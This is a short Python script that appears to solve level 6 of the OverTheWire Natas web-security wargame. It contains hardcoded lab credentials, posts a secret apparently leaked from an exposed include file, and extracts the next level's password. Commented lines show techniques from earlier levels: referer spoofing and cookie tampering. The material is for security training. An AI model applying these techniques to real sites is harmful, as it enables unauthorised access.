import requests
import re #regular expressions

username = "natas6"
password = "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT"

#head = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
#cookies = {"loggedin":"1"}
dataSend = {"secret":"FOEIUWGHFEEUHOFUOIU", "submit":"submit"}

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session() #Maintains a session
#response = session.get(url + "/includes/secret.inc", auth=(username, password))
response = session.post(url , auth=(username, password), data=dataSend)
content = response.text

#print (session.cookies["loggedin"])
#print (content)
print (re.findall("natas7 is (.*)",content)[0])
